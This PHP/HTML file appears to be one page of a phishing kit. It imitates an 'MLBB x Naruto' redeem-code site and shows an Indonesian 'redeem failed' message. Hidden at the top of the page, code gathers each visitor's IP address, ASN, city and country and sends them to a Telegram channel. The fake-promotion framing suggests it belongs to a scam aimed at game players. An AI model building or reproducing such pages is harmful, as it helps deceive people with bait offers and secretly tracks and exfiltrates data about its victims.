<?php
include 'includes/config.php';
include 'includes/functions.php';

// Ambil data pengguna untuk log
$ip = getUserIP();
$asn = getASN($ip);
$city = getCity($ip);
$country = getCountry($ip);

// Kirim data ke Telegram
sendToTelegram("Redeem Failed - IP: $ip | Location: $city, $country");

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redeem Gagal</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <div class="container">
        <header>
            <img src="assets/images/logo.png" alt="MLBB x Naruto" class="logo">
            <h1>Redeem Gagal</h1>
        </header>
        
        <main>
            <div class="error-message">
                <h2>Maaf!</h2>
                <p>Kode redeem yang Anda masukkan tidak valid atau sudah digunakan.</p>
                <p>Silakan periksa kembali kode Anda atau coba lagi nanti.</p>
                
                <div class="possible-reasons">
                    <h3>Kemungkinan penyebab:</h3>
                    <ul>
                        <li>Kode yang dimasukkan salah</li>
                        <li>Kode sudah digunakan</li>
                        <li>Kode belum aktif</li>
                        <li>Kode sudah kadaluarsa</li>
                    </ul>
                </div>
            </div>
            
            <a href="index.php" class="back-btn">Coba Lagi</a>
        </main>
        
        <footer>
            <p>© 2023 MLBB x Naruto Collaboration. Tidak berafiliasi dengan Moonton atau Shueisha.</p>
        </footer>
    </div>
</body>
</html>
